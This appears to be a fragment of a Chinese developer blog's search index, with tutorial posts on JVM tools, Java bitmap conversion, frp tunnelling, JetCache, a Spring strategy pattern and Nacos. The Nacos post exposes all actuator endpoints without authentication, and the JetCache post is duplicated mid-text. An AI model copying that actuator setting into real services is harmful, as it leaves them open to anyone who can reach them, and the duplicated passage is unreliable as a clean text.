Vm工具使用","section":"博客","content":" 作用 # jvisualVM是JDK自带的Java性能分析工具，在JDK的bin目录下，文件名就叫jvisualVM.exe。\njvisualvm可以监控本地、远程的java进程，实时查看进程的cpu、堆、线程等参数，对java进程生成dump文件，并对dump文件进行分析。\n插件安装 # 插件安装：https://visualvm.github.io/pluginscenters.html\n下载 下载要安装的插件 打开visualVM工具，在工具-\u0026gt;插件-\u0026gt;已下载，选择下载好的插件安装。\n导入jmap导出的dump # 通过 jmap -dump:live,format=b,file=d:/b.bin 7576 导出的dump文件，可以装载到jVisualVM中进行分析。\n点击文件-\u0026gt;载入，选择我们导出好的dump文件即可。\n"},{"id":46,"href":"/posts/2022/Jmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","title":"Jmap工具使用","section":"博客","content":" 作用： # jmap是JDK中提供的一个用来监视进程运行中的jvm物理内存的占用情况的工具。该进程内存内，所有对象的情况，例如产生了哪些对象，对象数量。当系统崩溃时，jmap 可以从core文件或进程中获得内存的具体匹配情况，包括Heap size, Perm size等。\n影响： # 使用jmap会影响线上运行的应用，所以尽量不要在线上执行此命令。如果想dump堆信息，可以使用gcore命令，比jmap -dump快。\nJmap的使用 # 1、查看堆信息\njmap -heap \u0026lt;PID\u0026gt;\n可以通过jps命令来查看正在运行的java应用进程。\n$ jps 7576 jar 9962 Jps 然后查看对应堆信息\n$ jmap -heap 7576 Attaching to process ID 7576, please wait... Debugger attached successfully. Server compiler detected. JVM version is 25.212-b10 using thread-local object allocation. Parallel GC with 4 thread(s) Heap Configuration: MinHeapFreeRatio = 0 MaxHeapFreeRatio = 100 MaxHeapSize = 2116026368 (2018.0MB) NewSize = 44564480 (42.5MB) MaxNewSize = 705167360 (672.5MB) OldSize = 89653248 (85.5MB) NewRatio = 2 SurvivorRatio = 8 MetaspaceSize = 21807104 (20.796875MB) CompressedClassSpaceSize = 1073741824 (1024.0MB) MaxMetaspaceSize = 17592186044415 MB G1HeapRegionSize = 0 (0.0MB) Heap Usage: PS Young Generation Eden Space: capacity = 116391936 (111.0MB) used = 65823008 (62.773712158203125MB) free = 50568928 (48.226287841796875MB) 56.552893836219035% used From Space: capacity = 11534336 (11.0MB) used = 0 (0.0MB) free = 11534336 (11.0MB) 0.0% used To Space: capacity = 11534336 (11.0MB) used = 0 (0.0MB) free = 11534336 (11.0MB) 0.0% used PS Old Generation capacity = 84410368 (80.5MB) used = 13827064 (13.186515808105469MB) free = 70583304 (67.31348419189453MB) 16.380764979013005% used 16171 interned Strings occupying 1390008 bytes. 2、查看堆内存中类占用信息\njmap -histo:live \u0026lt;PID\u0026gt; | grep [过滤类]\n$ jmap -histo:live 7576 | grep com.example. 194: 100 2400 com.example.jetcache.jetcache.model.UserVO 1254: 1 56 com.example.jetcache.jetcache.service.InvalidUserService$$EnhancerBySpringCGLIB$$b2e448c 1255: 1 56 com.example.jetcache.jetcache.service.UserService$$EnhancerBySpringCGLIB$$cec2f015 1664: 1 32 com.example.jetcache.jetcache.JetcacheApplication$$EnhancerBySpringCGLIB$$745909b5 2016: 1 24 com.example.jetcache.jetcache.controller.UserController 2017: 1 24 com.example.jetcache.jetcache.service.InvalidUserService 2018: 1 24 com.example.jetcache.jetcache.service.UserService 2370: 1 16 com.example.jetcache.jetcache.dao.UserDao 2371: 1 16 com.example.jetcache.jetcache.service.UserService$$EnhancerBySpringCGLIB$$cec2f015$$FastClassBySpringCGLIB$$4bd67238 2372: 1 16 com.example.jetcache.jetcache.service.UserService$$FastClassBySpringCGLIB$$764105c0 3、生成并导出堆信息，live是先触发gc，再统计导出信息\njmap -dump:live,format=b,file=d:\\\\d.bin \u0026lt;PID\u0026gt;\n$ jmap -dump:live,format=b,file=d:\\d.bin 7576 Dumping heap to D:\\d.bin ... Heap dump file created "},{"id":47,"href":"/posts/2022/%E5%9B%BE%E7%89%87%E8%BD%ACBitMap%E4%BD%8D%E5%9B%BE/","title":"图片转 Bit Map位图","section":"博客","content":"记录一下如何生成位图字节码\npublic static byte[] imgToInstruct(int o_x, int o_y, int mode, BufferedImage bi) throws Exception{ //定义指令拼装部分尾部 byte[] i2=\u0026#34;\\r\\n\u0026#34;.getBytes(\u0026#34;utf-8\u0026#34;); //生成2进制字符串 int[] rgb = new int[3]; int width = bi.getWidth(); int height = bi.getHeight(); int wModByte = (width % 8) == 0 ? 0 : 8 - (width % 8); int pixelCount = (width + wModByte) * height; int wPrintByte = (width + wModByte) / 8; StringBuilder res = new StringBuilder(); for (int y = 0; y \u0026lt; height; y++) { for (int x = 0; x \u0026lt; width; x++) { int pixel = bi.getRGB(x, y); // 下面三行代码将一个数字转换为RGB数字 rgb[0] = (pixel \u0026amp; 0xff0000) \u0026gt;\u0026gt; 16; rgb[1] = (pixel \u0026amp; 0xff00) \u0026gt;\u0026gt; 8; rgb[2] = (pixel \u0026amp; 0xff); String bitStr = (rgb[0] + rgb[1] + rgb[2]) / 3 \u0026gt;= 200 ? \u0026#34;1\u0026#34; : \u0026#34;0\u0026#34;; res.append(bitStr); } for (int k = 0; k \u0026lt; wModByte; k++) { res.append(\u0026#34;1\u0026#34;); } } //生成二值图（黑白图像）字节流 String x=res.toString(); byte[] i1 =new byte[x.length()/8]; for(int i=0;i\u0026lt;x.length();i=i+8) { String y =x.substring(i,i+4); String z=x.substring(i+4,i+8); byte y1=Byte.parseByte(y,2); byte z1=Byte.parseByte(z,2); i1[i/8]=(byte)(((byte)(y1\u0026lt;\u0026lt;4)) | z1); } //数组合并 String istr=String.format(\u0026#34;BITMAP %d,%d,%d,%d,%d,\u0026#34;,o_x,o_y,wPrintByte,height,mode); byte[] i0=istr.getBytes(\u0026#34;utf-8\u0026#34;); byte[] retVal =new byte[i0.length + i1.length + i2.length]; System.arraycopy(i0,0,retVal,0,i0.length); System.arraycopy(i1,0,retVal,i0.length,i1.length); System.arraycopy(i2,0,retVal,i0.length+i1.length,i2.length); return retVal; } 2、image To byte\npublic static byte[] imageToByte(BufferedImage bi) { int[] rgb = new int[3]; int width = bi.getWidth(); int height = bi.getHeight(); StringBuilder res = new StringBuilder(); int i; String y; for(int x = 0; x \u0026lt; width / 8 * 8; ++x) { for(int y = 0; y \u0026lt; height / 8 * 8; ++y) { i = bi.getRGB(x, y); rgb[0] = (i \u0026amp; 16711680) \u0026gt;\u0026gt; 16; rgb[1] = (i \u0026amp; \u0026#39;\\uff00\u0026#39;) \u0026gt;\u0026gt; 8; rgb[2] = i \u0026amp; 255; y = (rgb[0] + rgb[1] + rgb[2]) / 3 \u0026gt;= 200 ? \u0026#34;0\u0026#34; : \u0026#34;1\u0026#34;; res.append(y); } } String x = res.toString(); byte[] i1 = new byte[x.length() / 8]; for(i = 0; i \u0026lt; x.length(); i += 8) { y = x.substring(i, i + 4); String z = x.substring(i + 4, i + 8); byte y1 = Byte.parseByte(y, 2); byte z1 = Byte.parseByte(z, 2); i1[i / 8] = (byte)((byte)(y1 \u0026lt;\u0026lt; 4) | z1); } byte[] bytes = new byte[]{(byte)(width / 8 % 256), (byte)(width / 8 / 256), (byte)(height / 8 % 256), (byte)(height / 8 / 256)}; bytes = byteMerger(bytes, i1); return bytes; } "},{"id":48,"href":"/posts/2022/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8/","title":"Frp内网穿透使用","section":"博客","content":"由于项目要开发调试第三方的回调，回调地址必须是外网的一个ip地址或者域名，为了方便调试应用，下面搭建一个外网穿透服务来使用，把外网地址映射到本地机器上。\n个人使用frp来搭建内网穿透服务，frp分为frps服务端和frpc客户端，注意，在使用时，frps和frpc的版本要一样，不然可能会出现问题。\n附： frp的github 地址\n服务端的搭建 # 1、需要一个外网ip,域名，域名解析到ip上，如：frp.yuanmoc.cn解析到我的ip上。\n2、下载frp到我们的服务器，我是在Linux上搭建的frps，所以我下载了Linux版本frps，即frp_0.34.3_linux_amd64.tar.gz ，解压下载下来的文件 tar -zxvf frp_0.34.3_linux_amd64.tar.gz ，其中 frps 和 frps.ini 是我们需要的文件，注意frps要有可执行的权限，即\nchmod +x frps` 3、编写修改 frps.ini 配置文件\n[common] bind_addr = 0.0.0.0 # 全部客户端可连接 bind_port = 7000 # 绑定的端口，在客户端上要对应 vhost_http_port = 8000 # 映射的http请求端口 # 安全起见，加上授权 authentication_method = token # 授权方式token token = xxx # token的值，要在客户端的common添加此授权 4、启动服务端，可以使用以下命令进行执行\nfrps -c frps.ini 5、启动成功后会有如下日志\n2021/01/09 22:05:16 [I] [service.go:190] frps tcp listen on 0.0.0.0:7000 2021/01/09 22:05:16 [I] [service.go:232] http service listen on 0.0.0.0:8080 2021/01/09 22:05:16 [I] [root.go:215] start frps success 客户端的搭建 # 1、下载客户端，由于我要在Windows上使用，所以就下载了个Windows版本，即frp_0.34.3_windows_amd64.zip，解压，其中 frpc 和 frpc.ini 是我们要使用到的，这里要注意一下，frpc是客户端的而frps是服务端的，别搞错了哦。\n2、编写配置文件 frpc.ini\n[common] server_addr = x.x.x.x # 刚才服务端的外网ip地址 server_port = 7000 # 服务端的绑定的端口，即 bind_port 的值 token = xxx # 授权token # ssh 连接，目前没有用到 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 6000 # web 服务，这个是我们需要的 [web] type = http # 类型是http,当然还会有https类型 local_port = 8080 # 本地你web服务启动的端口 custom_domains = frp.yuanmoc.cn # 一开始你解析的域名 # 可以有多个，当然我这里一个就够用了 #[web2] #type = http #local_port = 8081 #custom_domains = frp2.yuanmoc.cn 3、启动客户端\n./frpc.exe -c frpc.ini 启动成功后，在客户端会显示如下日志：\n2021/01/09 22:06:42 [I] [service.go:288] [ad516891811f3c34] login to server success, get run id [ad516891811f3c34], server udp port [0] 2021/01/09 22:06:42 [I] [proxy_manager.go:144] [ad516891811f3c34] proxy added: [ssh web] 2021/01/09 22:06:42 [I] [control.go:180] [ad516891811f3c34] [ssh] start proxy success 2021/01/09 22:06:42 [I] [control.go:180] [ad516891811f3c34] [web] start proxy success 在服务端也会显示如下日志：\n2021/01/09 22:06:41 [I] [service.go:444] [ad516891811f3c34] client login info: ip [119.123.72.17:14167] version [0.34.3] hostname [] os [windows] arch [amd64] 2021/01/09 22:06:41 [I] [tcp.go:63] [ad516891811f3c34] [ssh] tcp proxy listen port [6000] 2021/01/09 22:06:41 [I] [control.go:446] [ad516891811f3c34] new proxy [ssh] success 2021/01/09 22:06:41 [I] [http.go:92] [ad516891811f3c34] [web] http proxy listen for host [frp.yuanmoc.cn] location [] group [] 2021/01/09 22:06:41 [I] [control.go:446] [ad516891811f3c34] new proxy [web] success 4、这下就可以通过外网的域名去调试你本地的项目了\n外网访问http://frp.yuanmoc.cn:8000就会映射到本地的http://localhost:8080上，用于调试某些api的回调非常方便。 http://frp.yuanmoc.cn:8000 -\u0026gt; http://localhost:8080 其中8000端口是你在frp服务端设置的vhost_http_port，8080是客户端设置的local_port，也是你web项目启动的端口。\n服务端后台启动 # 为了方便使用，一般服务程序都会在后台启动，这里也编写一个脚本来使用，这里的start.sh，frps，frps.ini都在同一个目录下。\n1、创建文件并给予可执行权限\ntouch start.sh chmod +x start.sh 2、把以下内容添加到start.sh文件\n#!/bin/bash # 启动 start(){ echo \u0026#34;start frps......\u0026#34; nohup ./frps -c ./frps.ini \u0026gt; frps.log 2\u0026gt;\u0026amp;1 \u0026amp; echo $! \u0026gt; $PIDFILE if [ $? -ne 0 ] then echo \u0026#34;Could not create PID file\u0026#34; exit 1 else echo \u0026#34;frps running......\u0026#34; fi } # 停止 stop(){ PID=$1 ps -p $PID \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 if [ $? -eq 0 ] then echo \u0026#34;stop frps......\u0026#34; kill -9 $PID echo \u0026#34;stop completing......\u0026#34; fi } # 重启 restart(){ stop $1 start } PIDFILE=./frps.pid if [ -f $PIDFILE ] then PID=$(cat $PIDFILE) restart $PID else start fi 3、执行\n./start.sh 最后附上 官方文档，学习更多。\n"},{"id":49,"href":"/posts/2022/jetCache%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Jet Cache的使用","section":"博客","content":"jetcahce是阿里出品的一套缓存系统，下面进行简单的使用，同时附上 官方文档地址。\n使用lettuce客户端连接redis的方式（jetcahce里面有jedis和lettuce两种连接redis的方式，个人比较喜欢使用lettuce，因为他是使用netty实现的，效率比较高，同时是多线程安全的）。\n1、添加jetcache-starter-redis-lettuce和jetcache-starter-redis依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alicp.jetcache\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jetcache-starter-redis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.14\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alicp.jetcache\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jetcache-starter-redis-lettuce\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2、为jetcache配置远程连接redis和本地缓存\njetcache: statIntervalMinutes: 15 areaInCacheName: false # 本地缓存，使用linkedhashmap实现 local: default: type: linkedhashmap keyConvertor: fastjson # 远程缓存，使用lettuce的方式连接 remote: default: type: redis.lettuce keyConvertor: fastjson uri: redis://password@127.0.0.1:6379/ valueEncoder: java valueDecoder: java poolConfig: minIdle: 5 maxIdle: 20 maxTotal: 50 3、添启动配置 @EnableMethodCache注解是激活@Cached注解的 @EnableCreateCacheAnnotation注解是激活CreateCache注解的\n@SpringBootApplication @EnableMethodCache(basePackages = \u0026#34;com.example.jetcache.jetcache\u0026#34;) @EnableCreateCacheAnnotation public class JetcacheApplication { public static void main(String[] args) { SpringApplication.run(JetcacheApplication.class, args); } } 4、简单使用\n@Service public class UserService { @CreateCache(name = \u0026#34;user\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) private Cache\u0026lt;String, UserVO\u0026gt; userCache; @CreateCache(name = \u0026#34;userList\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) private Cache\u0026lt;String, List\u0026lt;UserVO\u0026gt;\u0026gt; usersCache; @Resource private UserDao userDao; @Cached(name = \u0026#34;userList\u0026#34;, key = \u0026#34;\u0026#39;\u0026#39;\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) public List\u0026lt;UserVO\u0026gt; getUserList() { return userDao.getUserList(); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#id\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) public UserVO getById(Integer id) { return userDao.getById(id); } @CacheUpdate(name=\u0026#34;user.\u0026#34;, key=\u0026#34;#user.id\u0026#34;, value=\u0026#34;#user\u0026#34;) void updateUser(UserVO user) { userDao.updateUser(user); } @CacheInvalidate(name=\u0026#34;user\u0026#34;, key=\u0026#34;#userId\u0026#34;) void deleteUser(Integer userId) { userDao.deleteUser(userId); } public Boolean deleteById(Integer id) { userCache.REMOVE(String.valueOf(id)); usersCache.REMOVE(\u0026#34;\u0026#34;); return userDao.deleteById(id); } } 5、使用过程中缓存没有失效问题\n在使用的过程中，出现了一次缓存无效，使用的时候搞了以下操作。 ftcahce是阿里出品的一套缓存系统，下面进行简单的使用，同时附上 官方文档地址。\n使用lettuce客户端连接redis的方式（jetcahce里面有jedis和lettuce两种连接redis的方式，个人比较喜欢使用lettuce，因为他是使用netty实现的，效率比较高，同时是多线程安全的）。\n1、添加jetcache-starter-redis-lettuce和jetcache-starter-redis依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alicp.jetcache\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jetcache-starter-redis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.14\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alicp.jetcache\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jetcache-starter-redis-lettuce\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2、为jetcache配置远程连接redis和本地缓存\njetcache: statIntervalMinutes: 15 areaInCacheName: false # 本地缓存，使用linkedhashmap实现 local: default: type: linkedhashmap keyConvertor: fastjson # 远程缓存，使用lettuce的方式连接 remote: default: type: redis.lettuce keyConvertor: fastjson uri: redis://password@127.0.0.1:6379/ valueEncoder: java valueDecoder: java poolConfig: minIdle: 5 maxIdle: 20 maxTotal: 50 3、添启动配置 @EnableMethodCache注解是激活@Cached注解的 @EnableCreateCacheAnnotation注解是激活CreateCache注解的\n@SpringBootApplication @EnableMethodCache(basePackages = \u0026#34;com.example.jetcache.jetcache\u0026#34;) @EnableCreateCacheAnnotation public class JetcacheApplication { public static void main(String[] args) { SpringApplication.run(JetcacheApplication.class, args); } } 4、简单使用\n@Service public class UserService { @CreateCache(name = \u0026#34;user\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) private Cache\u0026lt;String, UserVO\u0026gt; userCache; @CreateCache(name = \u0026#34;userList\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) private Cache\u0026lt;String, List\u0026lt;UserVO\u0026gt;\u0026gt; usersCache; @Resource private UserDao userDao; @Cached(name = \u0026#34;userList\u0026#34;, key = \u0026#34;\u0026#39;\u0026#39;\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) public List\u0026lt;UserVO\u0026gt; getUserList() { return userDao.getUserList(); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#id\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) public UserVO getById(Integer id) { return userDao.getById(id); } @CacheUpdate(name=\u0026#34;user.\u0026#34;, key=\u0026#34;#user.id\u0026#34;, value=\u0026#34;#user\u0026#34;) void updateUser(UserVO user) { userDao.updateUser(user); } @CacheInvalidate(name=\u0026#34;user\u0026#34;, key=\u0026#34;#userId\u0026#34;) void deleteUser(Integer userId) { userDao.deleteUser(userId); } public Boolean deleteById(Integer id) { userCache.REMOVE(String.valueOf(id)); usersCache.REMOVE(\u0026#34;\u0026#34;); return userDao.deleteById(id); } } 5、使用过程中缓存没有生效问题\n在使用的过程中，出现了一次缓存无效，使用的时候搞了以下操作。\n1、在外部调用getUser方法，而在类内调用createCache方法，同时缓存作用在createCache中，这时缓存就没有效果。\n@Service public class InvalidUserService { @Resource private UserDao userDao; public UserVO getUser(UserVO userVO) { return createCache(userVO.getId()); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#userId\u0026#34;) public UserVO createCache(Integer userId) { return userDao.getById(userId); } } 主要的原因是AOP切面时，通过代理类调用了getUser方法，再在内部调用了createCache方法，这时，createCache方法没有经过代理类的调用，所以注解就没有效果。然后我们的解决方法是让我们的方法走代理就可以了。\n2、我们可以通过下面方法来使其走到代理类的调用 （1）把 getUser方法 与 createCache 方法写于不同的类中。 （2）将自身注入到类中，并调用，强行走代理，即\n@Service public class InvalidUserService { @Resource InvalidUserService self; @Resource private UserDao userDao; public UserVO getUser(UserVO userVO) { return self.createCache(userVO.getId()); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#userId\u0026#34;) public UserVO createCache(Integer userId) { return userDao.getById(userId); } } （3）通过ApplicationContext获取代理对象，然后走代理\n@Service public class InvalidUserService { @Resource private ApplicationContext applicationContext; @Resource private UserDao userDao; public UserVO getUser(UserVO userVO) { return applicationContext.getBean(InvalidUserService.class).createCache(userVO.getId()); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#userId\u0026#34;) public UserVO createCache(Integer userId) { return userDao.getById(userId); } } "},{"id":50,"href":"/posts/2022/%E4%BD%BF%E7%94%A8Spring%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AD%96%E7%95%A5/","title":"使用 Spring实现一个策略","section":"博客","content":"在很多场景中，我们都需要根据不同的行为调用不同的一个实现业务逻辑，这里就可以使用策略模式来实现。\n下面在Spring中来实现一个策略模式,场景：根据不同的打印方式，调用不同的打印指令。\n下面主要使用了注解与Spring BeanPostProcessor 相结合，在项目启动时，将注解的类添加到PrinterStrategy中管理，然后通过传过来的参数获取相应的类去执行。\n1、创建一个枚举类，记录类型\npublic enum PrinterEnum { ESC,TSC } 2、创建一个注解类，用于添加标识类型并交于Spring管理\n@Target(value = ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Component public @interface PrinterAnnotation { /** * type 类别 * @return */ PrinterEnum type() default PrinterEnum.ESC; String description() default \u0026#34;\u0026#34;; } 3、创建一个抽象打印类\npublic abstract class PrinterAbstract { public abstract void getPrintEsc(); } 4、实现两种打印方式，并为其加上打印注解\n@PrinterAnnotation(type = PrinterEnum.ESC) public class EscPrinter extends PrinterAbstract { public void getPrintEsc() { System.out.println(\u0026#34;esc\u0026#34;); } } @PrinterAnnotation(type = PrinterEnum.TSC) public class TscPrinter extends PrinterAbstract { public void getPrintEsc() { System.out.println(\u0026#34;tsc\u0026#34;); } } 5、创建一个静态方法，方便获取与使用\npublic class PrinterStrategy { private static Map\u0026lt;PrinterEnum, PrinterAbstract\u0026gt; printers; static { printers = new ConcurrentHashMap\u0026lt;PrinterEnum, PrinterAbstract\u0026gt;(); } public static PrinterAbstract getPrinters(PrinterEnum type) { if (printers != null) { return printers.get(type); } return null; } public static void setPrinters(PrinterEnum type, PrinterAbstract printerAbstract) { printers.put(type, printerAbstract); } } 6、在项目启动时，将打印类添加到 PrinterStrategy 中管理\n@Component public class PrinterProcessor implements BeanPostProcessor { public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { Class\u0026lt;?\u0026gt; aClass = bean.getClass(); if (aClass.isAnnotationPresent(PrinterAnnotation.class)) { PrinterAnnotation annotation = aClass.getAnnotation(PrinterAnnotation.class); PrinterEnum type = annotation.type(); PrinterStrategy.setPrinters(type, (PrinterAbstract) bean); } return bean; } public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { return bean; } } 6、可以调用并使用\n@SpringBootApplication @RestController public class DemoApplication { public static void main(String[] args) { SpringApplication.run(DemoApplication.class, args); } @RequestMapping(\u0026#34;/test/{printerType}\u0026#34;) public String test(@PathVariable PrinterEnum printerType) { PrinterAbstract printers = PrinterStrategy.getPrinters(printerType); if (printers != null) { printers.getPrintEsc(); } return \u0026#34;success\u0026#34;; } } "},{"id":51,"href":"/posts/2022/Nacos%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Nacos的使用","section":"博客","content":" 配置中心 # 启动配置中心\n在SpringBoot中使用 # 1、添加web依赖和nacos配置中心依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-actuator\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-config-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-config-spring-boot-actuator\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2、在配置文件application.properties中添加nacos配置\n# Nacos配置中心地址 nacos.config.server-addr=127.0.0.1:8848 # endpoint http://localhost:8080/actuator/nacos-config # health http://localhost:8080/actuator/health # 不需要身份验证的情况下访问所有actuator端点 management.endpoints.web.exposure.include=* # 将健康信息展示给所有用户 management.endpoint.health.show-details=always 3、在配置类中启用Nacos配置中心\n@SpringBootApplication @NacosPropertySource(dataId = \u0026#34;example\u0026#34;, groupId = \u0026#34;DEFAULT_GROUP\u0026#34;, autoRefreshed = true) public class NacosConfigApplication { public static void main(String[] args) { SpringApplication.run(NacosConfigApplication.class, args); } } 其中dataId和groupId对应我们在配置中心中配置的DataId和group值。如下图 4、示例代码测试。\n@Controller @RequestMapping(\u0026#34;config\u0026#34;) public class ConfigController { @NacosValue(value = \u0026#34;${useLocalCache:false}\u0026#34;, autoRefreshed = true) private boolean useLocalCache; @RequestMapping(value = \u0026#34;/get\u0026#34;, method = GET) @ResponseBody public boolean get() { return useLocalCache; } } 在SpringCloud中使用 # 1、添加web和Nacos依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-config\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.2.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2、在boostrap.properties中配置Nacos\nspring.cloud.nacos.config.server-addr=127.0.0.1:8848 spring.application.name=example spring.cloud.nacos.config.file-extension=properties 在 Nacos Spring Cloud 中，dataId 的完整格式如下：\n${prefix}-${spring.profiles.active}.${file-extension}\nprefix 默认为 spring.application.name 的值，也可以通过配置项 spring.cloud.nacos.config.prefix来配置。 spring.profiles.active 即为当前环境对应的 profile，详情可以参考 Spring Boot文档。 注意：当 spring.profiles.active 为空时，对应的连接符 - 也将不存在，dataId 的拼接格式变成 ${prefix}.${file-extension} file-exetension 为配置内容的数据格式，可以通过配置项 spring.cloud.nacos.config.file-extension 来配置。目前只支持 properties 和 yaml 类型。 3、示例代码\n@RestController @RequestMapping(\u0026#34;/config\u0026#34;) @RefreshScope public class ConfigController { @Value(\u0026#34;${useLocalCache:false}\u0026#34;) private boolean useLocalCache; /** * http://localhost:8080/config/get */ @RequestMapping(\u0026#34;/get\u0026#34;) public boolean get() { return useLocalCache; } } 多配置文件 # 很多应用都会用到多个配置文件管理配置，比如我们现在想要配置一个mysql和一个redis，但是又不想单独放在一个配置文件中，这时，我们就可以引用多个配置文件。\nspring.application.name=multi-data-ids-example spring.cloud.nacos.config.server-addr=127.0.0.1:8848 # 配置一个应用级的配置，需要自动刷新配置。 spring.cloud.nacos.config.ext-config[0].data-id=app.properties spring.cloud.nacos.config.ext-config[0].group=multi-data-ids spring.cloud.nacos.config.ext-config[0].refresh=true # 配置一个Mysql数据源配置。 spring.cloud.nacos.config.ext-config[1].data-id=datasource.properties spring.cloud.nacos.config.ext-config[1].group=multi-data-ids # 配置一个Redis数据源配置。 spring.cloud.nacos.config.ext-config[2].data-id=redis.properties spring.cloud.nacos.config.ext-config[2].group=multi-data-ids 除了这样引入，我们还可以使用注解的形式引入\n@SpringBootApplication @NacosPropertySources({ @NacosPropertySource(dataId = \u0026#34;app.properties\u0026#34;, groupId = \u0026#34;multi-data-ids\u0026#34;, autoRefreshed = true), @NacosPropertySource(dataId = \u0026#34;datasource.properties\u0026#34;, groupId = \u0026#34;multi-data-ids\u0026#34;, autoRefreshed = false), @NacosPropertySource(dataId = \u0026#34;redis.properties\u0026#34;, groupId = \u0026#34;multi-data-ids\u0026#34;, autoRefreshed = false) }) public class SpringBootMySQLApplication { public static void main(String[] args) { SpringApplication.run(SpringBootMySQLApplication.class, args); } } 注册中心 # 服务发现 # 1、添加依赖\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.nacos\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-client\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.nacos\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-client\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.hibernate\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hibernate-validator\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.0.Final\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 2、配置Nacos服务地址\nserver.port=8070 